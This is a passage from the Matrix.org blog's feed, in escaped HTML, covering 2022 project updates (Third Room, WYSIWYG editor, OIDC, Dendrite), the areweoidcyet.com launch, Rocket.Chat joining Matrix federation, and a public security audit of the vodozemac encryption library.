&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;QEt80wvO4yY&quot; title=&quot;Third Room prototype demo 3&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;And don&#x27;t forget, it&#x27;s just a Matrix client - with no infrastructure required other than a normal Matrix server:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-08-15-thirdroom-overlay.jpg&quot; alt=&quot;Third Room Overlay&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, we are rapidly approaching the point where we’ll need support from technical artists to help create beautiful scenes and avatars and assets in order to make it all come to life - especially once the Blender and Unity pipelines, and&#x2F;or the Third Room editor are finished. If you’re interested in getting involved come chat at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#thirdroom:matrix.org&quot;&gt;#thirdroom:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;wysiwyg&quot;&gt;WYSIWYG&lt;&#x2F;h3&gt;
&lt;p&gt;Back in the real world, a recent new project that we haven’t spoken about much yet is adding consistent WYSIWYG (What You See Is What You Get) editing to the message composer in matrix-{react,ios,android}-sdk as used by Element Web&#x2F;iOS&#x2F;Android - as well as publishing the resulting WYSIWYG editor for the greater glory of the wider ecosystem.&lt;&#x2F;p&gt;
&lt;p&gt;This is a bit of a contentious area, because we’ve tried several times over the years to add a rich text editor to matrix-react-sdk - firstly with the &lt;a href=&quot;https:&#x2F;&#x2F;draftjs.org&#x2F;&quot;&gt;Draft.js&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;292&quot;&gt;implementation&lt;&#x2F;a&gt; by Aviral (which we abandoned after Facebook de-staffed Draft), and then later with a &lt;a href=&quot;https:&#x2F;&#x2F;www.slatejs.org&quot;&gt;Slate&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;1890&quot;&gt;implementation&lt;&#x2F;a&gt; by me (which we abandoned thanks to the maintenance burden of keeping up with Slate’s API changes).  Finally, burnt by the experience with third party solutions, Bruno wrote his own editor called &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;blob&#x2F;develop&#x2F;docs&#x2F;ciderEditor.md&quot;&gt;CIDER&lt;&#x2F;a&gt;, which was a great success and is what Element Web uses today to author messages including ‘pills’ for structured rooms&#x2F;users etc… but this deliberately didn’t provide full WYSIWYG functionality.  Meanwhile, Slack added WYSIWYG, forced it on, and &lt;a href=&quot;https:&#x2F;&#x2F;quuxplusone.github.io&#x2F;blog&#x2F;2019&#x2F;11&#x2F;20&#x2F;slack-rich-text-box&#x2F;&quot;&gt;screwed it up&lt;&#x2F;a&gt; - and apps like WhatsApp and Discord seem to get by fine without WYSIWYG. &lt;&#x2F;p&gt;
&lt;p&gt;However, given that users are now used to WYSIWYG in Teams and Slack, we’ve now decided to have another go at it, inspired by CIDER’s success - and with the novel twist that the heavy lifting of modelling and versioning the document and handling Unicode + CJK voodoo will be provided by a cross-platform native library written in Rust, ensuring that matrix-{react,ios,android}-sdk (and in future matrix-rust-sdk-based apps like Element X) all have precisely the same consistent semantics, and we don’t spend our lives fixing per-platform WYSIWYG bugs unless it really is a platform-specific issue with the user interface provided on that particular platform.&lt;&#x2F;p&gt;
&lt;p&gt;The project is fairly young but developing fast, and lives over at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-wysiwyg&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-wysiwyg&lt;&#x2F;a&gt; (better name suggestions welcome ;) - we’re aiming to get it into clients by the end of October.  The editor itself is not Matrix specific at all, so it’ll be interesting to see if other projects pick it up at all - and meanwhile, if we’ve done a good job, it’ll be interesting to see if this can be used to power Matrix-backed collaborative-editing solutions in future…&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;9_UhNBKUk7A&quot; title=&quot;WYSIWYG teaser on Android&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;&lt;strong&gt;Update&lt;&#x2F;strong&gt;: we should have mentioned that the WYSIWYG editor project is being built out by staff at Element, who very kindly have been sponsored to work on it by one of Element&#x27;s Big Public Sector Customers in order to get to parity with Teams.  Thank you!!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;are-we-oidc-yet&quot;&gt;Are We OIDC Yet?&lt;&#x2F;h3&gt;
&lt;p&gt;On the other hand, a project we recently &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;08&#x2F;10&#x2F;areweoidcyet-com-matrix-and-open-id-connect&quot;&gt;yelled about&lt;&#x2F;a&gt; a lot is Matrix’s transition to Open ID Connect for standards-based authentication and account management.  We announced this at the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;22&#x2F;the-mega-matrix-holiday-special-2021#openid-connect&quot;&gt;end of the year&lt;&#x2F;a&gt; and the project has built up huge momentum subsequently, culminating with the release of &lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&quot;&gt;https:&#x2F;&#x2F;areweoidcyet.com&lt;&#x2F;a&gt; last week to track the progress and remaining work.&lt;&#x2F;p&gt;
&lt;p&gt;Our plan is to use native OIDC in production for the first time to provide all the login, registration and account management for Third Room when it launches in a few weeks (using a branded Keycloak instance as the identity provider, for convenience).  After all, the last thing we wanted to do was to waste time building fiddly Matrix-specific login&#x2F;registration UI in Third Room when we’re about to move to OIDC!  This will be an excellent case study to see how it works, and how it feels, and inform the rest of the great OIDC experiment and proposed migration.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;dendrite-p2p&quot;&gt;Dendrite + P2P&lt;&#x2F;h3&gt;
&lt;p&gt;Meanwhile, the Next Generation team has continued to focus on their mission to make Dendrite as efficient and usable as possible. Within recent months, Dendrite has matured dramatically, with a considerable list of bugs fixed, performance significantly improved and new features added - push notifications, history visibility and presence to name a few notable additions.&lt;&#x2F;p&gt;
&lt;p&gt;Neil Alexander, Kegan and Till have continued to streamline the Dendrite architecture and to refactor areas of the codebase which have long needed attention, as well as moving from Kafka to NATS JetStream, an all-new caching model and some other fairly major architectural changes. We’ve also seen an increase of code contributions from the community and outside organisations, which is exciting, and the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;gomatrixserverlib&quot;&gt;gomatrixserverlib&lt;&#x2F;a&gt; library which underpins much of Dendrite is also seeing more active development and attention thanks to its use in the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;complement&quot;&gt;Complement&lt;&#x2F;a&gt; integration testing suite.&lt;&#x2F;p&gt;
&lt;p&gt;With the most recent &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;releases&quot;&gt;0.9.3 release&lt;&#x2F;a&gt;, we are proud to announce that &lt;strong&gt;Dendrite now&lt;&#x2F;strong&gt; &lt;strong&gt;passes 90% of Client-Server API tests and 95% of Server-Server API tests&lt;&#x2F;strong&gt; and has support for all specced room versions in use today. We have a growing community of users who are (quite successfully) trialling using Dendrite homeservers day-to-day, as well as our own public &lt;code&gt;dendrite.matrix.org&lt;&#x2F;code&gt; homeserver, which is open to the public for registration for anyone who wants to experiment with Dendrite without running their own deployment.&lt;&#x2F;p&gt;
&lt;p&gt;Dendrite plays an important role in our future strategy as it is also the homeserver implementation used for embedded homeservers, P2P development and experimentation. In addition to being able to scale up, we have also successfully scaled down, with the Element P2P demos proving that an embedded Dendrite homeserver can run comfortably on an iOS or Android device.&lt;&#x2F;p&gt;
&lt;p&gt;Research on the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pinecone&#x2F;&quot;&gt;Pinecone&lt;&#x2F;a&gt; overlay network for P2P Matrix has also continued, with Devon and Neil having experimented with a number of protocol iterations and spent considerable time bringing the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pinecone&#x2F;tree&#x2F;main&#x2F;cmd&#x2F;pineconesim&quot;&gt;Pinecone Simulator&lt;&#x2F;a&gt; up to scratch to help us to test our designs more rapidly. Our work in this area is helping us to form a better direction and strategy for P2P Matrix as a whole, which is moving more towards a hybridised model with the current Matrix federation — a little different to our original vision, but will hopefully result in a much smoother transition path for existing users whilst solving some potential scaling problems. The &lt;a href=&quot;https:&#x2F;&#x2F;arewep2pyet.com&quot;&gt;arewep2pyet.com&lt;&#x2F;a&gt; site is a living page which contains a high level overview of our goals and all the progress being made.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-s-left&quot;&gt;What’s left?&lt;&#x2F;h2&gt;
&lt;p&gt;Comparing all of the above with the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;22&#x2F;the-mega-matrix-holiday-special-2021#2022&quot;&gt;predictions for 2022&lt;&#x2F;a&gt; section of the end-of-year blog post, we’re making very strong progress in a tonne of areas - and the list above isn’t comprehensive.  For instance, we haven’t called out all the work that the Trust &amp;amp; Safety team are doing to roll out advanced moderation features by default to all communities - or the work that Eric has been doing to close the remaining gap between Gitter and Matrix by creating new static archives throughout Matrix.  Hydrogen has also been beavering away to provide a tiny but perfectly formed web client suitable for embedding, including the new embeddable Hydrogen SDK. We haven’t spoken about the work that the Cryptography team have been doing to adopt vodozemac and matrix-rust-sdk-crypto throughout matrix-{js,ios,android}-sdk, or improve encryption stability and security throughout.  We’ve also not spoken about the new initiative to fix long-term chronic bugs (outside of the work above) in general - or all the work being done around &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;30&#x2F;technical-faq-on-the-digital-markets-act&quot;&gt;Digital Markets Act interoperability&lt;&#x2F;a&gt;…&lt;&#x2F;p&gt;
&lt;p&gt;Other things left on the menu for this year include getting Threads out of beta: we’ve had a bit of an adventure here figuring out how to get the right semantics for notification badges and unread state in rooms with threads (especially if you use a mix of clients which support and don’t support threads), and once that’s done we’ll be returning to Spaces (performance, group permissions etc).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;matrix-2-0&quot;&gt;Matrix 2.0?&lt;&#x2F;h2&gt;
&lt;p&gt;Looking through this post (and congratulations if you’re still reading it at this point ;P), it really feels that Matrix is on the verge of shifting into a new phase.  Much as MacOS X started off as a promising but distinctly unoptimised operating system, and then subsequently got unrecognisably faster year by year (even on the same hardware!) as Apple diligently worked away optimising the kernel… similarly: we are now landing the architectural changes to completely transform how Matrix performs.&lt;&#x2F;p&gt;
&lt;p&gt;Between protocol changes like Sliding Sync, Faster Joins, native OIDC and native VoIP conferencing all landing at roughly the same time - and alongside new implementations like matrix-rust-sdk and vodozemac, let alone Third Room - it feels unquestionably like we have an unrecognisable step change on the horizon.  Our aim is to land as much of this as possible by the end of the year, and if we pull it off, I’m tempted to suggest we call the end result Matrix 2.0.&lt;&#x2F;p&gt;
&lt;p&gt;To the future! 🚀&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>areweoidcyet.com - Matrix and OpenID Connect</title>
        <published>2022-08-10T16:23:17+00:00</published>
        <updated>2022-08-10T16:23:17+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/08/10/areweoidcyet-com-matrix-and-open-id-connect/" type="text/html"/>
        <id>https://matrix.org/blog/2022/08/10/areweoidcyet-com-matrix-and-open-id-connect/</id>
        
        <content type="html">&lt;p&gt;TL;DR: we’ve just launched &lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&quot;&gt;areweoidcyet.com&lt;&#x2F;a&gt; to track the project to adopt OpenID Connect (OIDC) as &lt;em&gt;the&lt;&#x2F;em&gt; authentication method used by Matrix. It has a load of useful resources (&lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&#x2F;#faqs&quot;&gt;FAQs&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&#x2F;#when&quot;&gt;status&lt;&#x2F;a&gt; etc.) so do please check it out!&lt;&#x2F;p&gt;
&lt;p&gt;Hey folks,&lt;&#x2F;p&gt;
&lt;p&gt;As you may know, there is a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3861&quot;&gt;proposal&lt;&#x2F;a&gt; and project afoot to change the way authentication is done in Matrix…&lt;&#x2F;p&gt;
&lt;p&gt;Currently Matrix uses a &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&#x2F;v1.3&#x2F;client-server-api&#x2F;#client-authentication&quot;&gt;custom authentication protocol&lt;&#x2F;a&gt; baked into the Matrix spec. This poses a number of drawbacks. To overcome these drawbacks the project proposes migrating to use the industry standard authentication protocol OpenID Connect (OIDC) instead.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of why this is a good idea: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;hughns&#x2F;delegated-oidc-architecture&#x2F;proposals&#x2F;3861-delegated-oidc-architecture.md&quot;&gt;MSC3861&lt;&#x2F;a&gt; has all the details - please check it out! &lt;&#x2F;p&gt;
&lt;p&gt;The bottom line is that Matrix should focus on being a decentralised communication protocol - &lt;strong&gt;not&lt;&#x2F;strong&gt; an authentication protocol… and by adopting a dedicated authentication protocol we can benefit from all sorts of goodies such as easy 2FA and MFA, passwordless-auth via WebAuthn, Login via QR-code, alternative CAPTCHAs and so much more.&lt;&#x2F;p&gt;
&lt;p&gt;In support of this the proposal extends to the Matrix.org Foundation joining the OpenID Foundation as a non-profit member to support the work that the OpenID Foundation is doing to build a robust and audited ecosystem for open authentication.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst this project proposes a significant change to the Matrix ecosystem that would take some time to migrate to, we believe that it will better support the continued growth and adoption of Matrix in the years to come.&lt;&#x2F;p&gt;
&lt;p&gt;Today we are launching the &lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&#x2F;&quot;&gt;areweoidcyet.com&lt;&#x2F;a&gt; website which is packed with information and resources on the project:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;What? Why? When?&lt;&#x2F;li&gt;
&lt;li&gt;MSC proposals&lt;&#x2F;li&gt;
&lt;li&gt;Status of homeservers, clients, auth servers (OIDC Providers&#x2F;OPs)&lt;&#x2F;li&gt;
&lt;li&gt;A client implementation guide&lt;&#x2F;li&gt;
&lt;li&gt;Links to the Matrix OIDC Playground environment where you can try out the latest progress&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Please do take a look and come join us at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-auth:matrix.org&quot;&gt;#matrix-auth:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Best wishes,&lt;&#x2F;p&gt;
&lt;p&gt;Hugh &amp;amp; Quentin&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcoming Rocket.Chat to Matrix!</title>
        <published>2022-05-30T19:04:12+00:00</published>
        <updated>2022-05-30T16:16:53+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/05/30/welcoming-rocket-chat-to-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2022/05/30/welcoming-rocket-chat-to-matrix/</id>
        
        <content type="html">&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;rocketchat.png&quot; alt=&quot;Rocket.Chat ♥️ Matrix&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;We just wanted to take a moment to welcome &lt;a href=&quot;https:&#x2F;&#x2F;rocket.chat&quot;&gt;Rocket.Chat&lt;&#x2F;a&gt; to Matrix, given the &lt;a href=&quot;https:&#x2F;&#x2F;rocket.chat&#x2F;press-releases&#x2F;rocket-chat-leverages-matrix-protocol-for-decentralized-and-interoperable-communications&quot;&gt;recent announcement&lt;&#x2F;a&gt; that they are switching to using Matrix for standards-based interoperable federation!  This is incredible news: Rocket.Chat is one of the leading open source collaboration platforms with &lt;a href=&quot;https:&#x2F;&#x2F;rocket.chat&#x2F;company&#x2F;about-us&quot;&gt;over 12 million users&lt;&#x2F;a&gt;, and they will all shortly have the option to natively interoperate with the wider Matrix network: the feature has already landed (in alpha) in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;RocketChat&#x2F;Rocket.Chat&#x2F;releases&#x2F;tag&#x2F;4.7.0&quot;&gt;Rocket.Chat 4.7.0&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to thank the whole Rocket.Chat team for putting their faith in Matrix and joining the network: the whole idea of Matrix is that by banding together, different independent organisations can build an open decentralised network which is far stronger and more vibrant than any closed communication platform.  The more organisations that join Matrix, the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Metcalfe%27s_law&quot;&gt;more useful and valuable&lt;&#x2F;a&gt; the network becomes for everyone, and the more momentum there is to further refine and improve the protocol.  Our intention is that Matrix will grow into a massive open ecosystem and industry, akin to the open Web itself… and that every organisation participating, be that Rocket.Chat, Element, Gitter, Beeper, Famedly or anyone else will benefit from being part of it. We are stronger together!&lt;&#x2F;p&gt;
&lt;p&gt;Rocket.Chat’s implementation follows the “&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix#how-do-you-make-an-existing-chat-system-talk-matrix&quot;&gt;How do you make an existing chat system talk Matrix?&lt;&#x2F;a&gt;” approach we published based on our experiences of linking Gitter into Matrix. Looking at the initial &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;RocketChat&#x2F;Rocket.Chat&#x2F;pull&#x2F;23688&quot;&gt;pull request&lt;&#x2F;a&gt;, the implementation lets Rocket.Chat act as a Matrix Application Service, effectively acting as a bridge to talk to an appropriate Matrix homeserver.  From chatting with the team, it sounds like next steps will involve adding in encryption via our upcoming &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;issues&#x2F;699&quot;&gt;matrix-sdk-crypto node bindings&lt;&#x2F;a&gt; - and then looking at ways to transparently embed a homeserver like Dendrite, sharing data as much as possible between RC and Matrix, so Rocket.Chat deployments can transparently sprout Matrix interoperability without having to run a separate homeserver.  Super exciting!&lt;&#x2F;p&gt;
&lt;p&gt;You can see a quick preview of a Rocket.Chat user chatting away with an Element user on matrix.org via Matrix here:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;video style=&quot;width: 100%&quot; src=&quot;&#x2F;blog&#x2F;img&#x2F;164530391-e8b17ecd-a4d0-4ef8-a8b7-81230c1773d3.mp4&quot; controls&gt;&lt;&#x2F;video&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, exciting times ahead - needless to say we’ll be doing everything we can to support Rocket.Chat and ensure their Matrix integration is a success.  And at this rate, they might be distinctly ahead of the curve if they start shipping Dendrite!  Meanwhile, we have to wonder who will be next? Nextcloud? Mattermost? Place your bets… ;)&lt;&#x2F;p&gt;
&lt;p&gt;--Matthew&lt;&#x2F;p&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;&#x2F;h3&gt;
&lt;p&gt;Aaron from Rocket.Chat just published an &lt;a href=&quot;https:&#x2F;&#x2F;geekgonecrazy.com&#x2F;2022&#x2F;05&#x2F;30&#x2F;rocketchat-and-the-matrix-protocol&#x2F;&quot;&gt;excellent guide &amp;amp; video tour&lt;&#x2F;a&gt; for how to actually set up your Rocket.Chat instance with Dendrite to get talking Matrix!&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;oQhIH8kql9I&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;&#x2F;div&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Independent public audit of Vodozemac, a native Rust reference implementation of Matrix end-to-end encryption</title>
        <published>2022-05-16T17:04:16+00:00</published>
        <updated>2022-05-16T16:02:17+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/05/16/independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption/" type="text/html"/>
        <id>https://matrix.org/blog/2022/05/16/independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;It’s been &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&quot;&gt;quite a while&lt;&#x2F;a&gt; since our last independent E2EE review, and so we’re incredibly proud to present an &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;media&#x2F;Least%20Authority%20-%20Matrix%20vodozemac%20Final%20Audit%20Report.pdf&quot;&gt;entirely new independent security audit&lt;&#x2F;a&gt; of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&quot;&gt;vodozemac&lt;&#x2F;a&gt;, our next generation native Rust implementation of Matrix’s &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;blob&#x2F;master&#x2F;docs&#x2F;olm.md&quot;&gt;Olm&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;blob&#x2F;master&#x2F;docs&#x2F;megolm.md&quot;&gt;Megolm&lt;&#x2F;a&gt; E2EE protocols.  The audit has been conducted by &lt;a href=&quot;https:&#x2F;&#x2F;leastauthority.com&#x2F;&quot;&gt;Least Authority&lt;&#x2F;a&gt;, who specialise in &lt;a href=&quot;https:&#x2F;&#x2F;leastauthority.com&#x2F;security-consulting&#x2F;published-audits&#x2F;&quot;&gt;comprehensive audits&lt;&#x2F;a&gt; of security-sensitive decentralized technologies - and we are very grateful to &lt;a href=&quot;https:&#x2F;&#x2F;www.gematik.de&#x2F;anwendungen&#x2F;ti-messenger&quot;&gt;gematik&lt;&#x2F;a&gt;, who kindly shared the costs of funding the audit as part of their &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;07&#x2F;21&#x2F;germanys-national-healthcare-system-adopts-matrix&quot;&gt;commitment to Matrix for healthcare in Germany&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This audit was a bit of a whirlwind, as while we were clearly overdue an audit of Matrix’s E2EE implementations, we decided quite late in the day to focus on bringing vodozemac to auditable production quality rather than simply doing a refresh of the original &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&quot;&gt;libolm audit&lt;&#x2F;a&gt;.  However, we got there in time, thanks to a monumental sprint from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&#x2F;graphs&#x2F;contributors&quot;&gt;Damir and Denis&lt;&#x2F;a&gt; over Christmas.  The reason we went this route is that vodozemac is an enormous step change forwards in quality over &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;libolm&lt;&#x2F;a&gt;, and vodozemac is now the reference Matrix E2EE implementation going forward.  Just as libolm went live with NCC’s security review back in 2016, similarly we’re kicking off the first stable release of vodozemac today with Least Authority’s audit.  In fact, vodozemac just shipped as the default E2EE library in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;releases&#x2F;tag&#x2F;matrix-sdk-0.5.0&quot;&gt;matrix-rust-sdk 0.5&lt;&#x2F;a&gt;, released at the end of last week!&lt;&#x2F;p&gt;
&lt;p&gt;The main advantages of vodozemac over libolm include:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Native Rust - type, memory and thread safety is preserved both internally, and within the context of larger Rust programs (such as those building on matrix-rust-sdk).  This is particularly important given the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;06&#x2F;14&#x2F;adventures-in-fuzzing-libolm&quot;&gt;memory bugs&lt;&#x2F;a&gt; which libolm sprouted, despite our best efforts to the contrary.&lt;&#x2F;li&gt;
&lt;li&gt;Performance - vodozemac benchmarks roughly 5-6x faster than libolm on typical hardware&lt;&#x2F;li&gt;
&lt;li&gt;Better primitives - vodozemac is built on the best practice cryptographic primitives from the Rust community, rather than the generic Brad Conte primitives used by libolm.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Also, we’ve finally fixed one of the biggest problems with libolm - which was that the hardest bit of implementing E2EE in Matrix wasn’t necessarily the encryption protocol implementation itself, but how you glue it into your Matrix client’s SDK.  It turns out ~80% of the code and complexity needed to securely implement encryption ends up being in the SDK rather than the Olm implementation - and each client SDK ended up implementing its own independent state machine and glue for E2EE, leading to a needlessly large attack &amp;amp; bug surface.&lt;&#x2F;p&gt;
&lt;p&gt;To address this problem, vodozemac is designed to plug into &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;tree&#x2F;main&#x2F;crates&#x2F;matrix-sdk-crypto&quot;&gt;matrix-sdk-crypto&lt;&#x2F;a&gt; - an SDK-independent Rust library which abstracts away the complexities and risks of implementing E2EE, designed to plug into existing SDKs in any language.  For instance, Element Android already &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-android&#x2F;pull&#x2F;3209&quot;&gt;supports&lt;&#x2F;a&gt; delegating its encryption to matrix-sdk-crypto; Element iOS got this working too last week, and we’re &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Hywan&#x2F;matrix-rust-sdk&#x2F;commits&#x2F;feat-crypto-wasm&quot;&gt;hard at work&lt;&#x2F;a&gt; adding it to Element Web too.  (This set of projects is codenamed Element R).  Meanwhile, &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;chsyOWKvne4&quot;&gt;Element X&lt;&#x2F;a&gt; (the project to switch Element iOS and Element Android to use matrix-rust-sdk entirely) obviously benefits from it too, as matrix-rust-sdk now leans on matrix-sdk-crypto for its encryption.&lt;&#x2F;p&gt;
&lt;p&gt;Therefore we highly recommend that developers using libolm migrate over to vodozemac - ideally by switching to matrix-sdk-crypto as a way of managing the interface between Matrix and the E2EE implementation.  Vodozemac does also provides a similar API to libolm with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac-bindings&quot;&gt;bindings for JS and Python&lt;&#x2F;a&gt; (and C++ in progress) if you want to link directly against it - e.g. if you’re using libolm for something other than Matrix, for example XMPP, ActivityPub or Jitsi.  We’ll continue to support and maintain libolm for now though, at least until the majority of folks have switched to vodozemac.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of the audit itself - we recommend &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;media&#x2F;Least%20Authority%20-%20Matrix%20vodozemac%20Final%20Audit%20Report.pdf&quot;&gt;reading it yourself&lt;&#x2F;a&gt;, but the main takeaway is that Least Authority identified 10 valid concerns, of which we addressed 8 during the audit process. The remaining two are valid but lower priority, and we’ll fix them as part of our maintenance backlog.  All the issues identified are excellent valid points, and we’re very glad that Least Authority have added huge value here by highlighting some subtle gotchas which we’d missed.  (If you write Rust, you’ll particularly want to check out their zeroisation comments).&lt;&#x2F;p&gt;
&lt;p&gt;So: exciting times!  Vodozemac should be landing in a Matrix client near you in the near future - we’ll yell about it loudly once Element switches over.  In the meantime, if you have any questions, please head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#e2ee:matrix.org&quot;&gt;#e2ee:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks again to gematik for helping fund the audit, and to Least Authority for doing an excellent job - and being patient and accommodating beyond the call of duty when we suddenly switched the scope from libolm to vodozemac at the last minute ;)&lt;&#x2F;p&gt;
